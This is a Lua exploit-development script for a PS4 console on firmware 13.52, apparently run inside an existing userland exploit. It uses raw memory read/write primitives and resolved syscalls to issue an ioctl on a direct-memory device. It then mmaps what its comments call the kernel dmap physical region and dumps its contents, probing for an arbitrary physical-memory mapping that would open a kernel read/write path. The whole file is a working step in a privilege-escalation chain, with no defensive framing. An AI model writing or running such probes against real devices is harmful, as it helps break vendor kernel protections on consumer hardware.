-- PS4 FW 13.52 - DMEM ioctl+mmap@base test (r9u) — RISKY, after r9t confirms fresh boot
-- After ioctl(5,0x80108002,{0x2ec48000,0x100000}) (known safe: ret 0), mmap at offset=base
-- to see if the device maps the kernel-dmap phys region (0x2ec48000).
-- If it maps and shows non-zero kernel data -> arbitrary phys map -> kernel R/W path.
-- If game crashes here -> close this path definitively.

local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")

pcall(S.resolve, { ioctl = 54, mmap = 477 })

local function t(v)
  if v == nil then return -1 end
  if type(v) == "number" then return v end
  if type(v) == "table" and v.h ~= nil then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v)) or -1
end
local function rq(a) return t(mem.read_qword(a)) end

print("=== R9U START ===")
pcall(function()
  local buf = mem.alloc(0x200)
  mem.write_buffer(buf, string.rep(string.char(0x00), 0x200), 0x200)
  mem.write_qword(buf, 0x2ec48000)
  mem.write_qword(buf + 8, 0x100000)
  local r = t(S.ioctl(5, 0x80108002, buf))
  print(string.format("ioctl(5,0x80108002,{0x2ec48000,0x100000}) ret=0x%x", r))

  local m = t(S.mmap(0x2ec48000, 0x100000, 3, 0x0001, 5, 0))
  print(string.format("mmap(fd5,1MB,off=0x2ec48000)=0x%x", m))
  if m > 0x100000 and m < 0xFFFFFFFFFF then
    local s = "  content:"
    for i = 0, 11 do s = s .. string.format(" 0x%016x", rq(m + i * 8)) end
    print(s)
    local nonzero = false
    for i = 0, 32 do
      if rq(m + i * 8) ~= 0 then nonzero = true break end
    end
    print(string.format("  first 256B %s", nonzero and "NON-ZERO <=KERNEL DATA?" or "all zeros"))
  end
end)
print("=== R9U DONE ===")
